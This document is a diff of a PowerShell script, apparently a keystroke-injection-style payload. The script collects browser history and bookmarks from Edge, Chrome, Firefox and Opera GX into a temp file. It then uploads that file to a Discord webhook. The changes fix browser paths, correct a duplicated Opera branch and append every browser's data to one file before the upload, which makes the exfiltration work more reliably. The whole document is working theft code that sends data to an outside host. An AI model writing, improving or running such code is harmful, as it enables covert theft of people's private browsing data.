@@ -18,13 +18,18 @@ function Get-BrowserData {
     } elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
         $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
     } elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
-        $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"
+        $Path = "$env:USERPROFILE\Appdata\Local\Microsoft\Edge\User Data\Default\Bookmarks"
     } elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
-        $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+        $Path = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory -Filter "*default*" | Select-Object -ExpandProperty FullName | ForEach-Object { "$_\places.sqlite" }
     } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
         $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
-    } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
+    } elseif ($Browser -eq 'opera' -and $DataType -eq 'bookmarks') {
         $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+    }
+
+    if (!(Test-Path $Path)) {
+        Write-Warning "Path $Path not found"
+        return
     }
 
     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
@@ -41,23 +46,22 @@ function Get-BrowserData {
     }
 }
 
-$BrowserData = ""
 
-$BrowserData += "Chrome History:`n"
-Get-BrowserData -Browser "chrome" -DataType "history" | ForEach-Object { $BrowserData += $_.Data + "`n" }
+$BrowserDataPath = "$env:TMP/--BrowserData.txt"
 
-$BrowserData += "Chrome Bookmarks:`n"
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" | ForEach-Object { $BrowserData += $_.Data + "`n" }
+Get-BrowserData -Browser "edge" -DataType "history" >> $BrowserDataPath
 
-$BrowserData += "Edge History:`n"
-Get-BrowserData -Browser "edge" -DataType "history" | ForEach-Object { $BrowserData += $_.Data + "`n" }
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $BrowserDataPath
 
-$BrowserData += "Edge Bookmarks:`n"
-Get-BrowserData -Browser "edge" -DataType "bookmarks" | ForEach-Object { $BrowserData += $_.Data + "`n" }
+Get-BrowserData -Browser "chrome" -DataType "history" >> $BrowserDataPath
 
-$BrowserData += "Firefox History:`n"
-Get-BrowserData -Browser "firefox" -DataType "history"
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $BrowserDataPath
 
+Get-BrowserData -Browser "firefox" -DataType "history" >> $BrowserDataPath
+
+Get-BrowserData -Browser "opera" -DataType "history" >> $BrowserDataPath
+
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $BrowserDataPath
 
 function Upload-Discord {
 
@@ -88,9 +92,8 @@ function Upload-Discord {
         $response = $client.PostAsync($hookurl, $form).Result
         $content = [Text.Encoding]::UTF8.GetString($response.Content.ReadAsByteArrayAsync().Result)
     }
-    }
-    
-    if (-not ([string]::IsNullOrEmpty($dc))){
-        Upload-Discord -file "$env:TMP/--BrowserData.txt" -text "Browser data"
-    }
-    
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){
+Upload-Discord -file $BrowserDataPath -text "Browser data"
+}   
